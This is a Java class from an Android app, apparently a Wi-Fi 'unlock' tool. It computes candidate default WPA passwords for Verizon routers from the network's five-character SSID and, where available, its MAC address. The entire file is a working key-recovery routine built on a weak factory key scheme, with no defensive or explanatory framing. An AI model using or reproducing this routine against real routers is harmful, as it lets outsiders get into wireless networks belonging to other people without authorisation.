package com.anontech.wifiunlock;

import com.anontech.wifiunlock.R;

import android.content.res.Resources;
import android.os.Handler;
import android.os.Message;

public class VerizonKeygen extends KeygenThread {

	public VerizonKeygen(Handler h, Resources res) {
		super(h, res);
	}

	public void run(){
		String ssid = router.ssid;
		if ( ssid.length() != 5 )
		{
			handler.sendMessage(Message.obtain(handler, ERROR_MSG , 
					resources.getString(R.string.msg_shortessid5)));
			return;
		}
		char [] inverse = new char[5];
		inverse[0] = ssid.charAt(4);
		inverse[1] = ssid.charAt(3);
        inverse[2] = ssid.charAt(2);
		inverse[3] = ssid.charAt(1);
		inverse[4] = ssid.charAt(0);
		
		int result = 0;
		try{
			result = Integer.valueOf(String.copyValueOf(inverse), 36);
		}catch(NumberFormatException e){
			handler.sendMessage(Message.obtain(handler, ERROR_MSG , 
					resources.getString(R.string.msg_err_verizon_ssid)));
			return;
		}
		
		ssid = Integer.toHexString(result).toUpperCase();
		while ( ssid.length() < 6 )
			ssid = "0" + ssid;
	    if ( !router.mac.equals(""))
	    {
	    	pwList.add(router.mac.substring(3,5) + router.mac.substring(6,8) + 
	    					Integer.toHexString(result).toUpperCase());
	    }
	    else	
	    {
	    	pwList.add("1801" + Integer.toHexString(result).toUpperCase());
	    	pwList.add("1F90" + Integer.toHexString(result).toUpperCase());
	    }
	    handler.sendEmptyMessage(RESULTS_READY);
		return;
	}
}
